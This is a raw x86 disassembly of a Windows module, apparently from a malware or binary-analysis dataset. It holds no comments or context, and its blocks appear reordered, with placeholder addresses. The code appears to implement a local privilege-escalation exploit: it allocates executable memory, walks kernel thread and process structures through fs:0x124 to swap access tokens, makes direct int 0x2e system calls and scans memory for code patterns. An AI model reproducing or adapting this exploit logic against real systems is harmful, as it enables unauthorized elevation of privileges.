test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x4c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d4d6
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x68 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_100094e5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x90 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000968f
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
lea ecx [ ebx + 0xd0 ]
push ecx
push [ ebx + 0x78 ]
push [ ebx + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d4d6
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x78 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
lea eax [ ebx + 0x90 ]
mov ecx [ ebp - 0x38 ]
shl ecx 0x3
mov edx [ eax ]
mov edx [ edx + ecx + 0x4 ]
mov [ esi + 0x14 ] edx
mov eax [ eax ]
mov edx [ esi + 0x10 ]
mov [ eax + ecx + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_100096ce
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
call [ GetVersion@IAT ]
movzx ecx al
mov [ ebp - 0x28 ] ecx
xor ecx ecx
mov cl ah
movzx eax cl
mov [ ebp - 0x20 ] eax
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push 0x88000000
push rw-data
push rw-data
push esi
call [ CreateWindowExW@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi esi
jne r-xdata
push 0x57
jmp r-xdata
push 0x40
mov eax 0x1000
push eax
push eax
push esi
call [ VirtualAlloc@IAT ]
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx esi
jne r-xdata
push 0xffffffd3
jmp r-xdata
pop eax
jmp r-xdata
call sub_100098c4
mov [ ebp - 0x34 ] eax
cmp eax esi
jne r-xdata
push 0xffffffd8
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x30 ] 0xffffffff
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x28 ]
sub eax 0x4
je r-xdata
push 0xffffffbf
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000a0fc
dec eax
je r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
dec eax
jne r-xdata
cmp [ ebp - 0x20 ] 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b46f
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10009801
mov eax [ ebp - 0x30 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b73a
jmp r-xdata
call sub_1000a2cd
jmp r-xdata
call sub_1000ab6f
jmp r-xdata
add esp 0x14
mov [ ebp - 0x30 ] eax
sub_10009801
cmp [ ebp - 0x34 ] esi
je r-xdata
cmp edi esi
je r-xdata
push [ ebp - 0x34 ]
call [ ReleaseMutex@IAT ]
push [ ebp - 0x34 ]
call [ CloseHandle@IAT ]
cmp ebx esi
je r-xdata
push edi
call [ DestroyWindow@IAT ]
retn
push 0x8000
push esi
push ebx
call [ VirtualFree@IAT ]
sub_10009835
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
add eax esi
mov edx ecx
shr edx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx ecx
pop edi
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x1c ]
add eax esi
mov edx ecx
shr edx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx ecx
pop esi
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx esi
sub eax esi
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec edi
jne r-xdata
sub_10009898
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x18 ]
mov cl [ ebp + 0x14 ]
pop edi
mov [ esi + eax ] cl
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx esi
sub eax esi
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec edi
jne r-xdata
sub_100098c4
push esi
push edi
push rw-data
push 0x0
push 0x100000
call [ OpenMutexW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x3a98
push edi
call [ WaitForSingleObject@IAT ]
mov esi eax
cmp esi 0x80
je r-xdata
call [ GetLastError@IAT ]
push eax
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
mov eax edi
test esi esi
je r-xdata
pop edi
pop esi
retn
push ebx
call [ GetLastError@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
cmp esi 0x102
jne r-xdata
push ebx
push 0x79
jmp r-xdata
call [ SetLastError@IAT ]
xor eax eax
pop ebx
jmp r-xdata
sub_10009936
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push r--data
push esi
call sub_10009b69
pop ecx
test eax eax
pop ecx
je r-xdata
test esi esi
jne r-xdata
call eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax 0x5
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x6
jne r-xdata
cmp [ esi + 0xc ] 0x2
jne r-xdata
pop esi
leave
retn
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x1
jb r-xdata
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_100099aa
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
je r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
sub ecx 0x4
je r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x94 ] edx
je r-xdata
dec ecx
je r-xdata
pop esi
pop ebp
retn
mov eax [ eax + 0x98 ]
sub eax 0x98
je r-xdata
mov ecx [ eax + 0xc ]
cmp ecx esi
jne r-xdata
dec ecx
jne r-xdata
cmp eax ecx
je r-xdata
cmp ecx 0x1
jne r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x9c ] edx
je r-xdata
push eax
call sub_10009936
pop ecx
xor edx edx
mov ecx eax
cmp ecx esi
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp ecx 0x2
jne r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x84 ] edx
je r-xdata
mov eax [ eax + 0xa0 ]
sub eax 0xa0
je r-xdata
mov esi [ eax + 0x9c ]
cmp esi [ ebp + 0xc ]
je r-xdata
cmp [ eax + 0x94 ] edx
jne r-xdata
cmp [ eax + 0x10 ] si
push eax
jne r-xdata
mov eax [ eax + 0x88 ]
sub eax 0x88
je r-xdata
cmp eax ecx
je r-xdata
mov eax [ eax + 0xa0 ]
sub eax 0xa0
je r-xdata
jmp r-xdata
call sub_10009936
pop ecx
mov ecx eax
cmp ecx esi
je r-xdata
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x84 ] edx
je r-xdata
cmp eax ecx
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp eax ecx
je r-xdata
mov edx [ eax + 0x94 ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov eax [ eax + 0x88 ]
sub eax 0x88
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp [ eax + 0x9c ] edx
jne r-xdata
inc edx
cmp edx 0x3e8
jle r-xdata
mov eax [ eax + 0x98 ]
sub eax 0x98
je r-xdata
cmp eax ecx
je r-xdata
cmp [ eax + 0x84 ] edx
jne r-xdata
jmp r-xdata
cmp eax ecx
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
jmp r-xdata
inc esi
cmp esi 0x3e8
jle r-xdata
cmp [ eax + 0x84 ] edx
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_10009b69
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
cmp [ esi + 0x18 ] 0x0
push edi
je r-xdata
push [ esi ]
call [ GetProcAddress@IAT ]
mov ecx eax
call sub_1000d360
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x8 ]
inc eax
pop ecx
mov [ ebp - 0x6 ] ax
lea eax [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push eax
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] edi
push [ esi ]
call [ esi + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
sub eax [ esi ]
add eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop esi
leave
retn
test ecx ecx
je r-xdata
sub_10009bd3
push ebp
mov ebp esp
sub esp 0x9c
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
xor al al
jmp r-xdata
push 0x24
push ebx
push esi
call sub_1000d316
pop edi
pop esi
pop ebx
leave
retn
sub_10009d28
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x70
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0x5a4d
jne r-xdata
xor al al
mov edi [ eax + 0x3c ]
add edi eax
push 0xf8
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
cmp [ edi ] 0x4550
jne r-xdata
mov eax [ edi + 0x2c ]
mov ebx [ edi + 0x34 ]
add ebx eax
mov [ ebp - 0x68 ] ebx
add eax [ esi ]
mov [ ebp - 0x60 ] eax
mov eax [ edi + 0x1c ]
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x24 ] rw-data
mov eax [ esi + 0x8 ]
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jb r-xdata
cmp [ esi + 0xc ] 0x2
jne r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x24 ] rw-data
cmp [ esi + 0x10 ] 0x1
jae r-xdata
push rw-data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
push 0x1
push 0x1
push [ esi ]
call eax
mov edi eax
push [ ebp - 0x3c ]
call [ FreeLibrary@IAT ]
test edi edi
je r-xdata
push rw-data
push [ esi ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x6
push eax
push [ ebp - 0x34 ]
push [ ebp - 0x58 ]
push [ ebp - 0x54 ]
push [ ebp - 0x60 ]
push esi
jae r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
call sub_1000a05b
jmp r-xdata
call sub_10009f62
add eax [ esi ]
push eax
push rw-data
call sub_1000d4dc
pop ecx
pop ecx
test eax eax
jne r-xdata
add esp 0x18
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
add edi 0x14
jmp r-xdata
mov edi [ edi + 0x10 ]
test edi edi
je r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
add edi [ esi ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x70 ] edi
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx eax
shr ecx 0x1f
mov [ ebp - 0x7c ] cl
test cl cl
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
add eax [ esi ]
mov [ ebp - 0x78 ] eax
add eax 0x2
mov [ ebp - 0x74 ] eax
push rw-data
push eax
call sub_1000d4dc
pop ecx
pop ecx
test eax eax
jne r-xdata
add [ ebp - 0x70 ] 0x4
add edi 0x4
mov [ ebp - 0x6c ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x74 ]
call sub_1000d4dc
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
add eax ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x50 ] eax
sub eax [ ebp - 0x60 ]
mov [ ebp - 0x64 ] eax
add eax ebx
mov [ ebp - 0x34 ] eax
sub_10009f62
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
and [ ebp + 0x1c ] 0x0
push ebx
push esi
push edi
lea edi [ eax - 0x1000 ]
inc edi
inc [ ebp + 0x1c ]
cmp [ ebp + 0x1c ] 0x2000
jl r-xdata
cmp [ edi + 0x1 ] 0x8b
jne r-xdata
cmp [ edi ] 0x55
jne r-xdata
xor al al
cmp [ edi + 0x2 ] 0xec
jne r-xdata
mov ecx edi
xor esi esi
inc ecx
movzx eax [ ecx + 0x4 ]
movzx edx [ ecx + 0x3 ]
shl eax 0x8
add eax edx
mov ebx ecx
movzx edx [ ecx + 0x2 ]
shl eax 0x8
add eax edx
movzx edx [ ecx + 0x1 ]
shl eax 0x8
add ebx eax
lea eax [ edx + ebx + 0x5 ]
mov edx [ ebp + 0xc ]
cmp eax edx
jb r-xdata
cmp [ ecx ] 0xe8
jne r-xdata
inc esi
cmp esi 0x32
jl r-xdata
mov ebx [ ebp + 0x10 ]
add edx ebx
cmp eax edx
ja r-xdata
xor esi esi
inc eax
inc esi
cmp esi 0x32
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
jmp r-xdata
mov edx [ eax + 0x2 ]
cmp edx [ ebp + 0x14 ]
je r-xdata
add eax 0x6
xor edx edx
inc eax
inc edx
cmp edx 0x14
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ebx [ eax + 0x2 ]
cmp ebx [ ebp + 0x18 ]
jne r-xdata
add ecx 0x5
cmp [ ecx ] 0x85
jne r-xdata
cmp [ ecx + 0x1 ] 0xc0
jne r-xdata
cmp [ ecx + 0x2 ] 0x74
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
sub edx [ eax ]
lea ecx [ edx + ecx + 0x2 ]
mov [ eax + 0x14 ] ecx
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a05b
mov eax [ esp + 0x18 ]
push esi
push edi
xor edi edi
lea edx [ eax - 0x1000 ]
inc edx
inc edi
cmp edi 0x2000
jl r-xdata
cmp [ edx + 0x1 ] 0x8b
jne r-xdata
cmp [ edx ] 0x55
jne r-xdata
xor al al
cmp [ edx + 0x2 ] 0xec
jne r-xdata
lea eax [ edx + 0x3 ]
xor edi edi
inc eax
inc edi
cmp edi 0x32
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
jmp r-xdata
mov ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x18 ]
je r-xdata
add eax 0x6
xor esi esi
inc eax
inc esi
cmp esi 0x14
jl r-xdata
cmp [ eax + 0x1 ] 0x15
jne r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ecx [ eax + 0x2 ]
cmp ecx [ esp + 0x1c ]
jne r-xdata
add eax 0x6
xor ecx ecx
inc eax
inc ecx
cmp ecx 0x28
jl r-xdata
cmp [ eax + 0x1 ] 0xc0
jne r-xdata
cmp [ eax ] 0x85
jne r-xdata
cmp [ eax + 0x2 ] 0x74
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx + 0x4 ]
sub edx [ ecx ]
lea eax [ edx + eax + 0x2 ]
mov [ ecx + 0x14 ] eax
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_1000a0fc
push ebp
mov ebp esp
sub esp 0x250
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
push 0x57
cmp [ ebp + 0xc ] edi
je r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx edi
je r-xdata
mov esi 0x104
lea eax [ ebp - 0x250 ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableW@IAT ]
lea eax [ ebp - 0x250 ]
push eax
call [ wcslen@IAT ]
sub esi eax
lea eax [ ebp - 0x250 ]
push esi
push rw-data
push eax
call [ wcsncat@IAT ]
add esp 0x10
lea eax [ ebp - 0x250 ]
push edi
push 0x8000000
push 0x3
push edi
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push esi
call sub_1000be67
push 0xffffffd7
jmp r-xdata
pop eax
pop edi
pop esi
pop ebx
leave
retn
sub_1000a1b8
add esp 0x18
mov ebx eax
push esi
call [ CloseHandle@IAT ]
cmp ebx edi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_10009bd3
mov [ esp ] rw-data
push [ ebp + 0x8 ]
call [ lstrcpyA@IAT ]
push [ ebp + 0x8 ]
push rw-data
push [ ebp + 0xc ]
call [ SetPropA@IAT ]
lea eax [ ebp + 0x10 ]
push 0x7
mov [ ebp + 0x14 ] eax
lea eax [ ebp - 0x44 ]
push eax
push 0x1
push sub_1000a25a
mov [ ebp + 0x10 ] edi
push [ ebp + 0x8 ]
push 0x11
push rw-data
call sub_10009835
add esp 0x1c
mov eax [ ebp - 0x44 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp - 0x3c ]
push 0x0
push [ ebp + 0xc ]
mov edx esp
int 0x2e
add esp 0x14
or [ ebp + 0x8 ] 0xffffffff
mov eax [ ebp - 0x40 ]
push 0x0
push 0x0
mov edx esp
int 0x2e
add esp 0x8
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
push 0xffffffd4
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
pop eax
sub_1000a25a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov [ ecx ] edx
mov ecx [ eax + 0x8 ]
add ecx 0x4
mov edx [ eax + 0x10 ]
mov [ ecx ] edx
and [ ebp - 0x4 ] 0x0
push [ eax + 0x1c ]
push [ eax + 0x18 ]
lea ecx [ eax + 0x20 ]
push ecx
call [ eax + 0x14 ]
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a2cd
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x388
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ edi + 0x200 ]
mov [ ebp - 0x398 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13c ] ebx
lea eax [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000aa69
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000a7de
push edi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0x178 ] edi
mov eax edi
shr eax 0x10
mov [ ebp - 0x384 ] eax
mov [ ebp - 0x8c ] 0xa0
mov [ ebp - 0x16c ] 0x30
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x164 ] ebx
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x15c ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] ebx
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x140 ] ebx
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x94 ] eax
lea eax [ edi - 0xa0 ]
and eax 0xffff
mov [ ebp - 0x15c ] eax
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
add esp 0x28
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x17c ] eax
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x390 ] ebx
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov [ ebp - 0x90 ] eax
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push [ ebp - 0x90 ]
call sub_1000d316
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000a7ba
mov eax [ ebp - 0x7c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a523
add esp 0x30
mov [ ebp - 0x134 ] esi
lea eax [ ebp - 0x134 ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0x394 ] rw-data
push 0xa
pop eax
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0xa0 ] 0x1
jb r-xdata
lea ecx [ edi + 0x500 ]
mov [ ebp - 0x170 ] ecx
push 0x8
push 0x1c
push ecx
push eax
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x14
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25a
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassA@IAT ]
mov eax [ ebp - 0x384 ]
add eax 0xffffff60
and eax 0xffff
mov [ ebp - 0x15c ] eax
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call sub_1000d316
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x98 ] eax
sub_1000a7de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
